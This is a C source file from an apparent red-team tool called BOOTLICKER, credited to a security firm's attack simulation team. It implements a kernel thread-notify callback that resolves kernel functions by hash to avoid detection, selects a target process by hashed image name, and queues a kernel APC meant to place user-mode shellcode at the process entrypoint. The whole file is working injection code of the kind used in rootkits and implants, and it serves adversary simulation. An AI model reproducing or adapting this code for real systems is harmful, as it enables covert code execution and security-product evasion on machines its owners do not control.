/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment
} KAPC_ENVIRONMENT ;

BOOLEAN
NTAPI
KeInsertQueueApc(
	_In_ PRKAPC	Apc,
	_In_ PVOID	SystemArgument1,
	_In_ PVOID	SystemArgument2,
	_In_ KPRIORITY	Increment
);

VOID
NTAPI
KeInitializeApc(
	_In_ PRKAPC	Apc,
	_In_ PRKTHREAD	Thread,
	_In_ KAPC_ENVIRONMENT	Environment,
	_In_ PVOID	KernelRoutine,
	_In_ PVOID	RundownRoutine,
	_In_ PVOID	NormalRoutine,
	_In_ KPROCESSOR_MODE	ProcessMode,
	_In_ PVOID	NormalContext
);

typedef struct
{
	D_API( PsLookupProcessByProcessId );
	D_API( ZwQueryInformationProcess );
	D_API( PsLookupThreadByThreadId );
	D_API( ObOpenObjectByPointer );
	D_API( ObDereferenceObject );
	D_API( PsIsSystemThread );
	D_API( KeInsertQueueApc );
	D_API( KeInitializeApc );
	D_API( ExAllocatePool );
	D_API( ExFreePool );
	D_API( ZwClose );
} API ;

/* API Hashes */

#define H_API_PSLOOKUPPROCESSBYPROCESSID	0x0009b1c8 /* PsLookupProcessByProcessId */
#define H_API_ZWQUERYINFORMATIONPROCESS		0x0abca671 /* ZwQueryInformationProcess */
#define H_API_PSLOOKUPTHREADBYTHREADID		0x5eb140fa /* PsLookupThreadByThreadId */
#define H_API_OBOPENOBJECTBYPOINTER		0x4a0128db /* ObOpenObjectByPointer */
#define H_API_OBDEREFERENCEOBJECT		0x3de33965 /* ObDereferenceObject */
#define H_API_PSISSYSTEMTHREAD			0x824ddfc1 /* PsIsSystemThread */
#define H_API_KEINSERTQUEUEAPC			0xb406c5c3 /* KeInsertQueueApc */
#define H_API_KEINITIALIZEAPC			0x0dd2d23b /* KeInitializeApc */
#define H_API_EXALLOCATEPOOL			0xa1fe8ce1 /* ExAllocatePool */
#define H_API_EXFREEPOOL			0x3f7747de /* ExFreePool */	
#define H_API_ZWCLOSE				0xe391398c /* ZwClose */

/*!
 *
 * Purpose:
 *
 * Determines if the host process is our target to 
 * insert an APC. The APC will then create allocate 
 * the usermode shellcode, and insert it within the
 * PEB entrypoint.
 *
!*/
D_SEC( D ) VOID WINAPI ThreadNotifyRoutine( _In_ HANDLE ProcessId, _In_ HANDLE ThreadId, _In_ BOOLEAN Create ) 
{
	API		Api;
	UNICODE_STRING	Uni;

	SIZE_T		Len = 0;
	
	PKPCR		Pcr = NULL;
	PKAPC		Apc = NULL;
	PKMTBL		Tbl = NULL;
	HANDLE		Hnd = NULL;
	PETHREAD	Thd = NULL;
	PEPROCESS	Prc = NULL;
	PUNICODE_STRING	Pth = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );

	/* Get a pointer to the table */
	Tbl = C_PTR( G_PTR( KmTbl ) );

	Api.PsLookupProcessByProcessId = PeGetFuncEat( Tbl->KernelBase, H_API_PSLOOKUPPROCESSBYPROCESSID );
	Api.ZwQueryInformationProcess  = PeGetFuncEat( Tbl->KernelBase, H_API_ZWQUERYINFORMATIONPROCESS );
	Api.PsLookupThreadByThreadId   = PeGetFuncEat( Tbl->KernelBase, H_API_PSLOOKUPTHREADBYTHREADID );
	Api.ObOpenObjectByPointer      = PeGetFuncEat( Tbl->KernelBase, H_API_OBOPENOBJECTBYPOINTER );
	Api.ObDereferenceObject        = PeGetFuncEat( Tbl->KernelBase, H_API_OBDEREFERENCEOBJECT );
	Api.PsIsSystemThread           = PeGetFuncEat( Tbl->KernelBase, H_API_PSISSYSTEMTHREAD );
	Api.KeInsertQueueApc           = PeGetFuncEat( Tbl->KernelBase, H_API_KEINSERTQUEUEAPC );
	Api.KeInitializeApc            = PeGetFuncEat( Tbl->KernelBase, H_API_KEINITIALIZEAPC );
	Api.ExAllocatePool             = PeGetFuncEat( Tbl->KernelBase, H_API_EXALLOCATEPOOL );
	Api.ExFreePool                 = PeGetFuncEat( Tbl->KernelBase, H_API_EXFREEPOOL );
	Api.ZwClose                    = PeGetFuncEat( Tbl->KernelBase, H_API_ZWCLOSE );

	/* Get the process control routine */
	Pcr = C_PTR( __readgsqword( FIELD_OFFSET( KPCR, Self ) ) );

	/* Are we @ PASSIVE_LEVEL */
	if ( ! Pcr->Irql ) {

		if ( NT_SUCCESS( Api.PsLookupThreadByThreadId( ThreadId, &Thd ) ) ) {

			if ( ! Api.PsIsSystemThread( Thd ) ) {
				/* Get the EPROCESS object for the object */
				if ( NT_SUCCESS( Api.PsLookupProcessByProcessId( ProcessId, &Prc ) ) ) {
					/* Open a pseudo handle */
					if ( NT_SUCCESS( Api.ObOpenObjectByPointer( Prc, 0, NULL, 0, 0, KernelMode, &Hnd ) ) ) {
						/* Query length of the complete image name */
						if ( ! NT_SUCCESS( Api.ZwQueryInformationProcess( Hnd, ProcessImageFileName, NULL, 0, &Len ) ) ) {
							/* Allocate the buffer for the page */
							if ( ( Pth = Api.ExAllocatePool( NonPagedPool, Len ) ) != NULL ) {
								/* Query the complete image file name */
								if ( NT_SUCCESS( Api.ZwQueryInformationProcess( Hnd, ProcessImageFileName, Pth, Len, &Len ) ) ) {

									/* Enumerate from the top until we reach the path character */
									for ( USHORT Idx = ( Pth->Length / sizeof( WCHAR ) ) - 1 ; Idx != 0 ; --Idx ) {
										if ( Pth->Buffer[ Idx ] == L'\\' || Pth->Buffer[ Idx ] == L'/' ) {
											Uni.Buffer        = & Pth->Buffer[ Idx + 1 ];
											Uni.Length        = Pth->Length - ( Idx + 1 ) * sizeof( WCHAR );
											Uni.MaximumLength = Pth->MaximumLength - ( Idx + 1 ) * sizeof( WCHAR );
											break;
										};
									};

									/* Is this a our target? */
									if ( HashString( Uni.Buffer, Uni.Length ) == 0x0 ) {
										/* Have we already been run? */
										if ( InterlockedCompareExchange( &Tbl->InitialRun, TRUE, FALSE ) != TRUE ) {
											/* Allocate an APC */
											if ( ( Apc = Api.ExAllocatePool( NonPagedPool, sizeof( KAPC ) ) ) != NULL ) {	

												/* Initialize the APC */
												Api.KeInitializeApc( Apc, 
														     Thd, 
														     OriginalApcEnvironment, 
														     C_PTR( G_PTR( ApcKernelRoutine ) ),
														     NULL,
														     C_PTR( G_PTR( ApcNormalRoutine ) ),
														     KernelMode,
														     NULL );

												/* Attempt to queue. If we fail, free the pool */
												if ( ! Api.KeInsertQueueApc( Apc, NULL, NULL, 0 ) ) {
													/* Free the APC */
													Api.ExFreePool( Apc );
												};
											};
										};
									};
								};
								/* Free the path */
								Api.ExFreePool( Pth );
							};
						};
						/* Close the handle */
						Api.ZwClose( Hnd );
					};
					/* Decrement the count in the process */
					Api.ObDereferenceObject( Prc );
				};
			};
			Api.ObDereferenceObject( Thd );
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
};
